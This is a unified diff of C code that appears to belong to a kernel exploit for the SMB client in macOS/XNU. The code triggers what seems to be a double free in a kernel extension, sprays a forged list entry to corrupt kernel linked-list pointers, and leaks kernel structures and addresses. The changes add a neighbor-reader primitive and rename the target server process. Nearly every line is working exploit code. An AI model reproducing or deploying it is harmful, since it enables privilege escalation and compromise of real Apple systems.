@@ -58,7 +58,7 @@ int find_server_pid(void) {
         char name[NAME_MAX];
         proc_name(pids[i], name, sizeof(name));
         
-        if (strncmp(name, "smb_server", sizeof(name)) == 0) {
+        if (strncmp(name, "xepg_smbserver", sizeof(name)) == 0) {
             return pids[i];
         }
     }
@@ -154,6 +154,7 @@ int main(void) {
     
     int error = 0;
     int server_pid = find_server_pid();
+    kmem_neighbor_reader_t neighbor_reader = kmem_neighbor_reader_create(&smb_addr);
     kmem_zkext_free_session_t zkext_free_session = kmem_zkext_free_session_create(&smb_addr);
     
     struct complete_nic_info_entry dbf_entry = kmem_zkext_free_session_prepare(zkext_free_session);
@@ -164,7 +165,7 @@ int main(void) {
     fake_entry->next.next = NULL;
     fake_entry->next.prev = (void*)((uintptr_t)dbf_entry.possible_connections.tqh_last - offsetof(struct complete_nic_info_entry, possible_connections)) + offsetof(struct complete_nic_info_entry, next);
     
-    struct kmem_zkext_alloc_small_entry allocated_entry = kmem_zkext_alloc_small(&smb_addr, (char*)fake_entry + 8, 256 - 8 - 1);
+    struct kmem_zkext_alloc_small_entry allocated_entry = kmem_zkext_alloc_small(&smb_addr, neighbor_reader, (char*)fake_entry + 8, 256 - 8 - 1);
     
     dbf_entry.next.next = (void*)allocated_entry.address;
     dbf_entry.addr_list.tqh_first = NULL;
@@ -230,7 +231,7 @@ int main(void) {
     }, NULL, &found_index);
     xe_assert_err(error);
     xe_assert(found_index >= 0);
-    xe_assert(XE_VM_KERNEL_ADDRESS_VALID((uintptr_t)leaked_nbpcb->nbp_iod));
+    xe_assert_kaddr((uintptr_t)leaked_nbpcb->nbp_iod);
     
     struct sockaddr_in* nbpcb_addr = (struct sockaddr_in*)&leaked_nbpcb->nbp_sock_addr;
     uint16_t nbpcb_port = find_lport_for_fport(server_pid, ntohs(nbpcb_addr->sin_port));
